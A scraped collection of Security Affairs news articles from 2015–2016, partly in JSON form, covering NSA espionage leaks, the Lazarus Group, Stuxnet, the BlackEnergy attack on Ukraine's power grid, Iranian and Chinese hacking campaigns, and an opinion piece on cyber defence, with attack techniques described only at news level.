particular, one of the documents, reports eavesdropping activities conducted by the US intelligence that spied on the communication between the German Chancellor Angela Merkel and UN Secretary-General Ban Ki-moon on climate change negotiations.\n\nThe agents of the National Security Agency have bugged a private climate change strategy meeting between the two politicians held in Berlin.\n\nIn June 2015, Wikileaks released another collection of documents on the extended economic espionage activity conducted by the NSA in Germany. The cyber  the spies were particularly interested in the Greek debt crisis. The US intelligence targeted German government representatives due to their privileged position in the negotiations between Greece and the UE.\n\nJulian Assange, editor-in-chief at Wikileaks, released the following declaration on Wednesday:\n\n\u201c[it] further demonstrates that the United States\u2019 economic espionage campaign extends to Germany and to key European institutions and issues such as the European Central Bank and the crisis in Greece.\u201d \u201cWould France and Germany have proceeded with the BRICS bailout plan for Greece if this intelligence was not collected and passed to the United States \u2013 who must have been horrified at the geopolitical implications?\u201d \n\nThe new lot of classified documents also revealed that espionage on the Chief of Staff of UN High Commissioner for Refugees (UNHCR), an activity that was conducted by the US intelligence for a for a long time, the spies intercepted targeting his Swiss phone.\n\nUnder the control of the US intelligence there was also the Director of the Rules Division of the World Trade Organisation (WTO), Johann Human, but most interesting cables for the Italian Government are related the espionage of the Prime Minister Silvio Berlusconi.\n\nThe interceptions were conducted by the Special Collection Service (SCS), a team of cyber spies operating under diplomatic cover in US embassies and consulates around the world. \u201cBack in 2013, thanks to a Snowden document dated 2010, l\u2019Espresso and la Repubblica revealed how Italy was the only European country, along with Germany, to have two Scs teams on its territory: one in Rome and the other in Milan.\u2028\u2028\u201d reported an article published by the Italian L\u2019Espresso.\n\nThe documents leaked by Wikileaks confirmed that in March 2010 the US Government has intercepted communications between Italian Prime Minister and the Israeli PM Netanyahu, information disclosed reveals that Berlusconi promised to assist in helping Israel in mending the damaged relationship with the U.S..\n\nThe crisis between the United States and Israel was triggered by the announcement of Netanyahu\u2019s plans to build 1,600 houses  in East Jerusalem. Berlusconi offered its support to Israel in helping mend the situation.\n\nAccording to these documents leaked by Assange\u2019s organization, the NSA targeted targeted all the members of the Silvio Berlusconi\u2019s staff, including his personal advisor Valentino Valentini, Berlusconi\u2019s National Security Advisor Bruno Archi, Marco Carnelos, and the Permanent Representative of Italy to the NATO, Stefano Stefanini.\n\nIn October 2011, the NSA also intercepted a Valentino Valentini\u2019s top-secret/Noforn document.\n\nDocuments confirms the US intelligence also intercepted a critical private meeting between then French president Nicolas Sarkozy, Merkel and Berlusconi, where Sarkozy defined the situation of the Italian banking system as ready to \u201cpop like a cork.\u201d\n\nWhich is the position of the Italian Government?\n\nMany Italian security experts are not surprised by these revelations, myself included, from the institutional perspective, it seems that the current Italian Government is ignoring the serious facts.\n\n\u201cThe current Italian PM, Matteo Renzi, has essentially ignored the case, whereas the former Italian PM, Enrico Letta, speaking to the Chamber of Deputies in the midst of the most heated phases of the Nsa scandal, declared: \u00abBased on the analysis conducted by our intelligence services and our international contacts, we are not aware that the security of the communications of the Italian government and embassies has been compromised, nor are we aware that the privacy of Italian citizens has been compromised\u00bb. continues the Expresso.\n\nThe Italian government has summoned the American ambassador to Rome following the embarrassing revelations.\n\nThe document disclosed by Wikileaks also revealed other operations conducted by the US Intelligence, including the interception of the top EU and Japanese trade ministers.\n\n\u201cToday we proved the UN Secretary General Ban Ki-Moon\u2019s private meetings over how to save the planet from climate change were bugged by a country intent on protecting its largest oil companies. Back in 2010 we revealed that the then US Secretary of State Hillary Clinton had ordered her diplomats to steal the UN leadership\u2019s biometric data and other information. The US government has signed agreements with the UN that it will not engage in such conduct.

According to Kaspersky the hacking crew has been active since at least 2009 and is still operating undercover.\n\nKaspersky Lab, alongside with a number of security firms  including Novetta, AlienVault, Invincea, ThreatConnect, Volexity, Symantec, and PunchCyber have published reports related to the activities of the Lazarus Group.\n\nThe group of security firms formed an alliance called Operation Blockbuster that issued the detection signatures to neutralize the hacking tools used by the APT.\n\nThe Lazarus Group \u2019s arsenal includes the Destover wiper malware, the same used against the systems of the Sony Pictures Entertainment.\n\n\u201cThe group deployed multiple malware families throughout the years, including malware associated with Operation Troy and DarkSeoul, the Hangman malware (2014-2015) and Wild Positron / Duuzer (2015).

A simple example of code reuse is the networking functionality that includes a half-dozen hard-coded user-agents with the misspelling \u2018Mozillar\u2019 instead of Mozilla.\u201d states the post.\n\nThe experts also noticed other similarities in the modus operandi of the threat actors, such as the use of BAT files to delete malware pieces after infections and the password reuse in the malware droppers.\n\n\u201cThese BAT files are generated on the fly and, while they serve their purpose of eliminating initial infection traces, they ironically double as a great way to identify the malware itself by honing in on the path-placeholder strings that generate the randomly-named BAT files on the infected systems,\u201d Kaspersky Lab said in its report. \u201cA high-confidence indicator of correlation is the reuse of a shared password across malware droppers used to drop different malware variants. The droppers all kept their payloads within a password-protected ZIP under the resource name \u2018MYRES\u2019.

These drives were controlling the centrifuges that were enriching uranium.\u201d wrote Mikko Hypponen.\n\n\n\nThe researchers tested Stuxnet in the plant before spreading to compromise the real target. The NY Times reported an intense collaboration of researchers from the Idaho National Laboratory at Idaho Falls and experts from Siemens.\n\nInside the Idaho National Laboratory, US experts tested the Siemens PLC systems to discover security vulnerabilities to be exploited in Stuxnet attack. Siemens only confirmed that its support was a routine effort to improve the resilience of its solutions against cyber attacks.\n\n\u201cOver the past two years, according to intelligence and military experts familiar with its operations, Dimona has taken on a new, equally secret role \u2014 as a critical testing ground in a joint American and Israeli effort to undermine Iran\u2019s efforts to make a bomb of its own.\u201d reported The New York Times.\u00f9\n\nImage copyright Idaho National Laboratory and Siemens\n\n\u201cBehind Dimona\u2019s barbed wire, the experts say, Israel has spun nuclear centrifuges virtually identical to Iran\u2019s at Natanz, where Iranian scientists are struggling to enrich uranium. They say Dimona tested the effectiveness of the Stuxnet computer worm, a destructive program that appears to have wiped out roughly a fifth of Iran\u2019s nuclear centrifuges and helped delay, though not destroy, Tehran\u2019s ability to make its first nuclear arms.\u201d\n\nThe Stuxnet targeted a grid of 984 converters, the same industrial equipment that international inspectors found out of order when visited the Natanz enrichment facility in late 2009.\n\n\u201cThe cyber attack against the Cascade Protection System infects Siemens S7-417 controllers with a matching configuration. The S7-417 is a top-of-the-line industrial controller for big automation tasks. In Natanz, it is used to control the valves and pressure sensors of up to six cascades (or 984 centrifuges) that share common feed, product, and tails stations\u201d states \u201cA Technical Analysis of What Stuxnet\u2019s Creators Tried to Achieve\u201d written by the expert Ralph Langner.\n\nStuxnet was designed with a number of features that allowed to evade detection, its source code was digitally signed and the malware uses a man-in-the-middle attack to fool the operators into thinking everything is normal.\n\n\u201cBut as Mr. Langner kept peeling back the layers, he found more \u2014 what he calls the \u201cdual warhead.\u201d One part of the program is designed to lie dormant for long periods, then speed up the machines so that the spinning rotors in the centrifuges wobble and then destroy themselves. Another part, called a \u201cman in the middle\u201d in the computer world, sends out those false sensor signals to make the system believe everything is running smoothly. That prevents a safety system from kicking in, which would shut down the plant before it could self-destruct.\u201d wrote The New York Times.\n\nAccording to a leaked embassy cable obtained by Wikileaks, there would other enrichment plants in Iran involved in the Iran Nuclear Program.  Attacking such unknown targets with cyber sabotage makes much more sense than, say, trying to bomb them. A worm will find even the facilities that you do not know about.\n\nThe use of a cyber weapon against these potential targets presents a number of advantages, from the difficult attribution to the secrecy of the operations.\n\n\n\nUnfortunately, Stuxnet code is still easy to find, Hypponen explained that despite it is quite difficult to modify it, a nation-state actor could have the necessary knowledge to do it. This is the primary risk of the militarization of the cyberspace.\n\nLet\u2019s close with a statement from Mr.Langner about Stuxnet.\n\n\u201cCode analysis makes it clear that Stuxnet is not about sending a message or proving a concept,\u201d Mr. Langner later wrote. \u201cIt is about destroying its targets with utmost determination in military style.\u201d\n\nYears have passed, but the attack Stuxnet is more relevant than ever.

In 2015, the market will reach 75 billion and in 2020 it will grow to around 170 billion. For some countries like the US, Israel, India and Europe, the cyber industry is vital to their economy.\n\nBut, while the industry makes money, it doesn\u2019t solve the problems. If you don\u2019t believe me, try looking for a company that give you guarantee from cyber attacks. You can also look for cyber attacks statistics to see that the amount of attacks and their relative damage is on the rise.\n\nIn one of my last interviews with an Israeli branch manager of a known cyber defence company, he told me that the statistics didn\u2019t change for the last twenty years.  Yes, the solutions are more advanced and complicated, but the infection rate and the ability to identify a threat is the same.\n\n\u201cit\u2019s a Hamster Wheel\u201d, he told me. \u201cBut it\u2019s good money. So nobody care\u201d. \n\nThe Emperor\u2019s New Clothes\n\nThe question is what\u2019s broken? Is it the solutions that aren\u2019t good enough? The users that can\u2019t change their behavior? The international community that can\u2019t share information and cooperate? Maybe all of it is true. Perhaps the paradigm of cyber defense is fundamentally flawed.\n\nIf one is looking from a birds eye, down at the cyber defence industry, he will notice it\u2019s all about preventing information flow. In other words, the paradigm is that there are secrets, islands of private information, that should be hedged.\n\nBut the truth is that the world changed, and this paradigm stayed. If one reads Alvin & Heidi Toffler books [and a lot of other stuff on that subject], it becomes apparent that the information is the actual currency of our time. And as such, trying to prevent it from flowing is to go against economic and social evolution.\n\nIt\u2019s scary to think about an open digital world. The world without privacy that does not include secrets or private information. A system where sharing information is not mandatory, but a way of life. A culture of openness that most of the knowledge is common knowledge.\n\nIn a way, we all are living in such a world. Facebook, Youtube, Twitter, Instagram, WhatsUp, Wechat, Telegram and a lot of others \u2013 They are all information sharing platforms. And almost all of us are sharing our life experiences with them. All our secrets are already there, In the cyberspace. One only has to infect the information pieces to know them.\n\n\n\nUnder this perspective, the hackers and the NSA [and every other intelligence organization] understand something that the defense industry doesn\u2019t \u2013 You can\u2019t stop the information flowing.\n\nSo if you can\u2019t stop it, why try? And why sell dreams to the public? It\u2019s not a technical failure that you can fix. It\u2019s a mental failure you have to fix. Instead of thinking how to hide information, embrace the fact that everything is exposed and start to think what we can do with the information for the benefit of humanity or business.\n\nWAZE is one example. All the world already knows where I am, so why not use this information to make the traffic better. In Israel, the ministry of health is developing an app to balance the load in emergency rooms based on WAZE. It means that giving up my private information [My location] for public use, can save lives.\n\nIn reality, the cyber defense paradigm is broken, and Companies are looking for cyber insurance and regulation as a sign of disbelief in the cyber defense products. If the past twenty years would have produced working solutions, there was no \u201ccyber\u201d problem today.\n\nThe truth is that we are ahead of a future market dominated by mandatory behavior dictated by the government and insurance companies, rather than a market driven by positive thinking how to solve the problems.\n\nIn a cyberspace where \u201cmost do\u201d defense is the norm, hackers will always have the advantage. The defenders on the other side are like a hamster running on a wheel. To get off it, one should a make peace with the death of private information. To do so, we most change the paradigm of how we perceive the meaning of information in the digital world.\n\nWritten by Ami Rojkes Dombe\n\nPierluigi Paganini\n\n(Security Affairs \u2013 cyber defense, cyber security)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-defense", "topic_name": "cyber defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident-response", "topic_name": "incident response"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nsa", "topic_name": "NSA"}]}, {"news_name": "The BlackEnergy malware was a key element of the Ukraine power outage", "news_link": "https://securityaffairs.co/wordpress/43483/malware/43483.html", "title": "The BlackEnergy malware was a key element of the Ukraine power outage\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 11, 2016", "body": " On December 23, the entire Ivano-Frankivsk region in Ukraine suffered a major power outage, according to security experts and the Ukrainian Government the attackers used a destructive varian of the popular BlackEnergy malware.\n\nNow investigations are revealing new interesting aspects on the attack, it looks like the threat attackers took advantage of the power of BlackEnergy, in an article published by SANS is explained that this allowed the attackers to get a foothold on power-company systems, where they were able to open circuit breakers, which cut the power. The still unknown attackers probably used a utility called KillDisk, a disk eraser and performed a denial-of-service to stop company personnel from trying to receiving customer reports of outages.\n\n\n\nUnknown attackers used a wiper utility called KillDisk, and launched a denial-of-service on phone lines in order to stop company personnel from receiving customer reports of outages.\n\n\u201cThe attackers demonstrated planning, coordination, and the ability to use malware and possible direct remote access to blind system dispatchers, cause undesirable state changes to the distribution electricity infrastructure, and attempt to delay the restoration by wiping SCADA servers after they caused the outage. This attack consisted of at least three components: the malware, a denial of service to the phone systems, and the missing piece of evidence of the final cause of the impact. Current evidence and analysis indicates that the missing component was direct interaction from the adversary and not the work of malware. Or in other words, the attack was enabled via malware but consisted of at least three distinct efforts.\u201d wrote Michael J. Assante, SANS ICS Director.\n\nBelow the cyber attack milestones reported by the SANS:\n\nIt\u2019s important to explain that there is no evidence that the KillDisk was the unique cause of the power outage affecting 80,000 customers.\n\n\u201cThere have been two prominent theories in the community and speculation to the media that either the \u2018KillDisk\u2019 component was just inside the network and unrelated to the power outage (a reliability issue where malware just happened to be there) or that the \u2018KillDisk\u2019 component was directly responsible for the outage. It is our assessment that neither of these are correct. Malware likely enabled the attack, there was an intentional attack, but the \u2018KillDisk\u2019 component itself did not cause the outage.\u201d\u2026\u201d The malware campaign reported, tied to BlackEnergy and the Sandworm team by others, has solid links to this incident but it cannot be assumed that files such as the excel spreadsheet and other malware samples recovered from other portions of that campaign were at all involved in this incident. It is possible but far too early in the technical analysis to state that. \u201d \n\nThe SANS report leaves almost no space left for doubts, BlackEnergy was indeed the key ingredient of this attack:\n\n\u201cWe assess currently that the malware allowed the attackers to gain a foothold at the targeted utilities, open up command and control, and facilitate the planning of an attack by providing access to the network and necessary information,\u201d\u2026\u201dThe malware also appears to have been used to wipe files in an attempt to deny the use of the SCADA system for the purposes of restoration to amplify the effects of the attack and possibly to delay restoration.\u201d\n\nSCADA security is becoming even more important, experts believe that other similar attacks would happen in a short future.\n\nStay Tuned!\n\nAbout the Author Elsio Pinto\n\nPierluigi Paganini\n\n(Security Affairs \u2013 SCADA , BlackEnergy malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/blackenergy-malware", "topic_name": "BlackEnergy malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ukraine", "topic_name": "Ukraine"}]}, {"news_name": "Russian Army is largely investing in modern UAVs", "news_link": "https://securityaffairs.co/wordpress/43460/cyber-warfare-2/russian-army-uavs.html", "title": "Russian Army is largely investing in modern UAVs\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 10, 2016", "body": "Almost every government is increasing the adoption of drones within its military.\n\nUnmanned aerial vehicles (UAV) represent a privileged option for military surveillance, reconnaissance and attack, these vehicles could be used also to improve the physical security of critical infrastructure or to conduct covert hacking operations on an Information Warfare context.

The most recent campaigns are dated August 2014.\u201d states the blog post on VirusBulletin. \n\nAccording to ESET the campaign targeted  hundreds of victims mainly located in Eastern Europe.\n\n\u201cWe have observed more than 100 individual victims of these campaigns during our monitoring of the botnets,\u201d Lipovsky said. \u201cApproximately half of these victims are situated in Ukraine and half in Poland, and include several state organisations, various businesses, as well as targets which we were unable to identify.\u201d \n\nThe same nations hit by BlackEnergy malware were already targeted by another cyber espionage campaign documented by F-Secure, dubbed CosmicDuke, which targeted dozens of computers at government agencies across Europe.\n\nNow experts at ESET discovered a new component in the BlackEnergy trojan, the KillDisk component, which is capable of destroying some 4000 different file types and rendering machines unbootable.\n\nThe KillDisk component used to compromise the energy companies in Ukraine was slightly different from other versions, below the list of new features observed by the experts:\n\nThe BlackEnergy configuration example used in 2015 (ESET)\n\nThe strain of malware detected by ESET in 2015 also uses a previously unknown SSH backdoor to access the infected systems, in addition to BlackEnergy backdoor.\n\n\u201cESET has recently discovered that the BlackEnergy trojan was recently used as a backdoor to deliver a destructive KillDisk component in attacks against Ukrainian news media companies and against the electrical power industry. \u201d states the blog post published by ESET.\n\nThe experts at ESET highlighted the presence of Build IS numbers in the BlackEnergy code, these data could provide information useful for the attribution of the malicious code. In the specific case the build identity numbers suggest the possible involvement of Russian hackers, but ESET avoids confirming it.\n\n\u201cApart from a list of C&C servers, the BlackEnergy config contains a value called build_id. This value is a unique text string used to identify individual infections or infection attempts by the BlackEnergy malware operators. The combinations of letters and numbers used can sometimes reveal information about the campaign and targets.\u201d states the post \u201cWe can speculate that some of them have a special meaning.

Therefore, One of the critical issues in cyber deterrence is the ability to proof your capability to attack or to defence. If you can prove you can do it, the other side will be more convinced, and deterred.\n\nApplying Deterrence by punishment force you to prove to the other side that you can compromise or damage his systems.\n\nApplying Deterrence by denial force you to prove that you can defend your systems from a potential attack.\n\nIn both cases, the cost of the attack in the eyes of your opponent is rising. And with rising costs, he will think twice before carrying out one.  However, why should one expose his secretive cyber weapon or defence structure before he has to use them?\n\n\n\nMost of the Cyber weapons are disposable. Such are the defence solutions. If you expose your cyber weapon, your opponent will build a defence solution. If you do so with your defence structure, a hacker will find a way to bypass it. But what if there is a way to show your opponent your capabilities without reviling your secrets?\n\nOne method that potently could serve this propose is Zero knowledge proof [ZKP]. It\u2019s a way in cryptography to prove to the other side that you hold the secret without exposing it to him.\n\nAltho the Zero knowledge proof is used in cryptography, the abstract idea can play a role in Cyber deterrence to strengthen the capability projection of the player.\n\nLet\u2019s assume I have a cyber weapon that can destroy the opponent electric grid, and I want to use it to prevent him from destroying mine [I assume that he has an unknown, such weapon].\n\nIn that scenario, the first step is to convince him that I have such ability. But how can it be done? If I use it, deterrence will fail. If I don\u2019t, it will leave a great deal of uncertainty, and deterrence will fail. It seems as \u201cCatch 22\u201d scenario.\n\nHowever, if we add to this situation a Zero knowledge proof mechanism that will allow me to convince him that I have the ability without reviling it, deterrence can succeed.\n\nThere is no doubt it\u2019s an initial idea. For now, the Zero knowledge proof is used in cryptography and reuse it as a cyber weapon or defence structure proof mechanism requires further research.

The successful exploitation of both vulnerabilities led to the delivery of either a downloader that we refer to as IRONHALO, or a backdoor that we refer to as ELMER.\u201d states the report published by FireEye.\n\nThe representatives of the main opposition Democratic Progressive Party (DPP) seem to have the favor of voters at the expense of the other party politics closer to the Chinese Government.\n\n\n\nIn the past, the Taiwanese government websites were constantly under attack from China, not experts at FireEye identified nation-state actor that is running a spear phishing campaign on Taiwanese journalists with the subject-line reading \u201cDPP\u2019s Contact Information Update\u201d earlier this month.\n\n\u201cEach phishing message contained the same malicious Microsoft Word attachment. The malicious attachment resembled an article hosted on a legitimate Japanese defense-related website, as both discussed national defense topics and carried the same byline. The lure documents also used the Japanese calendar, as indicated by the 27th year in the Heisei period. This demonstrates that the threat actors understand conventional Japanese date notation.\u201d\n\nIn March, the DPP\u2019s website was brought down remaining down for at least four days, also in that case the experts blamed Chinese hackers.\n\n\u201cWe often received fake emails pretending to come from our colleagues, asking us to click some links or download some documents,\u201d said Ketty Chen, deputy director of the DPP\u2019s international affairs department.\n\nAnalyzing the TTPs of the threat actors the experts at FireEye confirmed the Chinese origin of the threat and their intention to gather information relating to the upcoming election.\n\n\u201cGiven the timing of these attacks, the reporters targeted, and the information used as a lure, it is possible that the attackers are seeking information relating to the upcoming election and about the DPP in particular,\u201d Bryce Boland, chief technology officer for Asia Pacific at FireEye, told to Agence France-Presse\n\nIt is a state of emergency in Taiwan, and in particular for the Democratic Progressive Party, its politicians are a privileged target for alleged state-sponsored hackers.\n\nA DPP official working for the cyber security of the Party, speaking on condition of anonymity, revealed that the organization is \u201cconstantly on guard\u201d and conducts regular Internet security training for its staff.\n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013 Chinese hackers , cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/chinese-hackers", "topic_name": "Chinese hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/taiwan", "topic_name": "Taiwan"}]}, {"news_name": "Twitter warns victims of state-sponsored attacks", "news_link": "https://securityaffairs.co/wordpress/42810/hacking/twitter-state-sponsored-attacks.html", "title": "Twitter warns victims of state-sponsored attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 16, 2015", "body": "Twitter is warning users of state-sponsored cyber attacks, a small number of users, including a few connected to security and privacy advocacy, have been notified that their accounts were targeted by nation-state hackers.\n\nThe Twitter users received the notifications in the inboxes, the warning messages started a couple of days ago.\n\nTwitter informed its users that hackers, likely associated with \u201ca government,\u201d were trying to compromise their account.

After the devastating incidents of Paris in November, many people fear that ISIS and other extremist attackers will not rest. Instead, they will keep on escalating things and spreading terror all over the world. As far as the United Kingdom is concerned, some claim that the Internet broadband network will be an easy target. However, when it comes to escalating and causing severe damage, the electric grid would be far more catastrophic!\n\nOf course, the net would die even in the case of turning off the lights all over the country. Furthermore, cyber terrorists can carry out a successful attack against the power grid jeopardizing human lives. This is what the extremists are after, right? So, it makes total sense that the electric power would be a more suitable target for them. Either way, the attacks would demand well-planned strategies and perfect coordination.\n\n\n\nJames Blessing is the Chair of the Internet Service Providers Association (ISPA) and has commented on the possibility of cyber criminals to target the UK network. He said that there are multiple locations to target and these locations have been created to be kept impenetrable:\n\n\u201cThese places are not unsecure, they are in highly-guarded locations that as a network engineer are a pain to get into. They are in high security buildings and there\u2019s usually a perimeter fence that is well away from the building.

Ever since 2007, the whole governmental infrastructure can immediately bounce to international servers and thus jeopardize any of the data. So, without being physically located in one place, people have managed to eliminate the risks of being targeted at a specific place.\n\nIn the light of such a growing need for protection online, Britain has announced \u00a31.9bn funding within a period of five years to safeguard the country against cyber-attacks, as well as the creation of a National Cyber Centre in the coming year, 2016.\n\nWritten by: Ali Qamar, Founder/Chief Editor at SecurityGladiators.com\n\nAuthor Bio:\nAli Qamar is an Internet security research enthusiast who enjoys \u201cdeep\u201d research to dig out modern discoveries in the security industry.

If they are unable to do that then there is no guarantee that we will have a reliable deterrent or the prime minister will be able to use this system when he needs to reach for it.\u201d states Browne.\n\nThe UK\u2019s former defense secretary is seeking assurance from the Prime Minister that the Trident nuclear weapons system is secured against attacks from hostile persistent threat actors, such as Russia and China.\n\n\n\nAccording to a report issued by the US department of Defense on Resilient Military Systems, there is the concrete risk that the US and its allies could suffer a major attack on their military systems.\n\n\u201cThe United States cannot be confident that our critical Information Technology (IT) systems will work under attack from a sophisticated and well-resourced opponent utilizing cyber capabilities in combination with all of their military and intelligence capabilities (a \u201cfull spectrum\u201d adversary).\u201d states the report. \u201cWhile this is also true for others (e.g. Allies, rivals, and public/private networks), this Task Force strongly believes the DoD needs to take the lead and build an effective response to measurably increase confidence in the IT systems we depend on (public and private) and at the same time decrease a would-be attacker\u2019s confidence in the effectiveness of their capabilities to compromise DoD systems. \u201c\n\nFor the protection of the Trident nuclear weapons system it is essential to assess the military components searching for possible weaknesses and fix them.\n\nAccording to the New Statesman, a spokesperson from the MoD explained that the Trident system is an air-gapped system, but we know that this is not sufficient to consider a system as security.\n\nSecurity experts at FireEye discovered a Chinese hacking crew, dubbed APT 30, that was focusing its cyber espionage operations on air-gapped networks. The APT30 has many other tools in its arsenal that includes backdoors, malware with the ability to compromise air-gapped networks, downloaders and many others. Some of these tools were used only by the APT30 operators.\n\nThe British chancellor George Osborne last week to announce that the UK Government would allocate more than \u00a33.2bn to cybersecurity over the next five years. Despite the significant effort, Browne expressed his skepticism on the protection of the Trident.\n\n\u201cMy instinct is to think that \u00a33.2bn over five years, comes nowhere near the scale of the cyber-threat challenge, if it includes ensuring cybersecurity for the command and control of our nuclear weapons. Also, this is the environment to which Moore\u2019s law applies.

The fact that the Iranian hackers were more interested in destruction instead gathering intelligence lead the experts to believe that the threat actors were not state-sponsored but pro-Iranian \u201chacktivists.\u201d\n\nThe recent attacks against The State Department attack is clearly a cyber espionage operation, they were initially attributed to Chinese hackers who may have infiltrated the department\u2019s unclassified e-mail systems.\n\nPierluigi Paganini\n\n(Security Affairs \u2013Iranian hackers, The State Department)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iranian-hackers", "topic_name": "Iranian hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacker", "topic_name": "state-sponsored hacker"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-state-department", "topic_name": "US State Department"}]}, {"news_name": "New insight on the Rocket Kitten Iranian hacking crew", "news_link": "https://securityaffairs.co/wordpress/41865/cyber-crime/rocket-kitten-report.html", "title": "New insight on the Rocket Kitten Iranian hacking crew\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 10, 2015", "body": "Do you remember the Rocket Kitten ATP?\n\nThe Rocket Kitten group has been suspected to be active since 2011 and have been increasing their activity since 2014. The main targets are based in the Middle East, and it seems that their targets are involved in policy research, diplomacy and international affairs like policy research, diplomacy and international affairs.\n\nSeveral security firms have analyzed the operations conducted by the Rocket Kitten, experts have used different names to reference the hacking crew. FireEye linked the group to the cyber espionage campaign \u201cOperation Saffron Rose\u201c, the experts at iSIGHT Partners discovered the group was using a network of fake accounts on principal social media to spy on US officials and political staff worldwide,  the NEWSCASTER network. Again, the experts from ClearSky uncovered the Thamar Reservoir operation that is targeting entities in the Middle East, meanwhile researchers at Trend Micro in March a new hacking campaign dubbed Operation Woolen GoldFish likely run by a threat actor group Rocket Kitten.\n\nThe Rocket Kitten group is very active and despite the numerous investigations of security firms it is continuing to conduct cyber espionage operations by using different tools in their arsenal for each hacking campaign.\n\nThe Rocket Kitten hackers are now in the headlines thanks to a new report published by the Check Point security firm. Check Point was investigating a phishing attack against one of its customers when discovered a server used by the Rocket Kitten group.\n\nAccording to the report \u201cRocket Kitten: A Campaign with 9 Lives,\u201d the hackers used a common XAMPP web server that was poorly configured, allowing the investigators to gain root access without authentication.\n\nThe experts at Check Point discovered that more than 1,800 victims were already successfully targeted by Rocket Kitten, their information was stored in the database present on the server.\n\nThe analysis of the logs from the phishing server revealed the most visitors came from Saudi Arabia (18%), the United States (17%), Iran (16%), the Netherlands (8%) and Israel (5%).\n\n\u201cThis list was analyzed to confirm a strong alignment with nation-state political interests, with specific victims known as adversarial or of intelligence value to Iran.\u201d states the report.\n\n\n\nIt is curious to note that nearly 26 percent of visitors provided their credentials.\n\nEach victim was associated with a particular Rocket Kitten operator, in one case a single operator harvested details of nearly 700 victims. Another operator phished 522 users as part of a campaign targeting human rights activists, company executives and ministry officials in Saudi Arabia.\n\n\u201cLooking at user names, we can spot some potentially Persian names or aliases such as merah, kaveh, ahzab or amirhosein. These were potentially the campaign \u2018operators\u2019\u2014tasked with social engineering and tailoring a phishing page per target.\u201d states the report.\n\nA third operator collected information belonging to 233 individuals in organizations operating in the defense sector, including in NATO countries, the United Arab Emirates, Afghanistan, Thailand, and Turkey.\n\nThe hackers also targeted Iranians living abroad, Israeli nuclear scientists, former military officials, national security and foreign policy researchers and Venezuelan entities.\n\n\n\nThe analysis of the phishing server allowed the investigators to reveal the identity of the main developer of the hacking crew, an individual using the nickname \u201cWool3n.H4T.\u201d\n\n\u201cIn this case, as in other previously reported cases, it can be assumed that an official body recruited local hackers and diverted them from defacing web sites to targeted espionage at the service of their country. As is often the case with such inexperienced personnel, their limited training reflects in lack of operational security awareness, leaving a myriad of traces to the origin of the attack and their true identities,\u201d Check Point said in its report.\n\nIf you want to do deeper on the investigation give a look to the excellent \u201cRocket Kitten: A Campaign with 9 Lives\u201d report published by Check Point.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Rocket Kitten, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rocket-kitten", "topic_name": "Rocket Kitten"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}]}, {"news_name": "The German Intelligence Systematically Spied on Allies", "news_link": "https://securityaffairs.co/wordpress/41807/hacking/german-intelligence-spied-allies.html", "title": "The German Intelligence Systematically Spied on Allies\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 7, 2015", "body": "In the last months, the German Intelligence has accused the NSA of spying on Government members, including the Chancellor Angela Merkel.\n\nIn October, the German authorities have launched a probe into allegations of a new case of US espionage after they have found a laptop infected by the Regin Spyware.\n\nThe German Parliament also suffered numerous cyber attacks that spread a highly sophisticated malware inside the network of the Bundestag, the investigators speculate the involvement of nation-state actors, likely Russian state-sponsored hackers.\n\nVictims or victimizers?\n\nThe German intelligence agency BND has already been accused of spying on officials at the French foreign ministry and the presidency, as well as the European Commission.

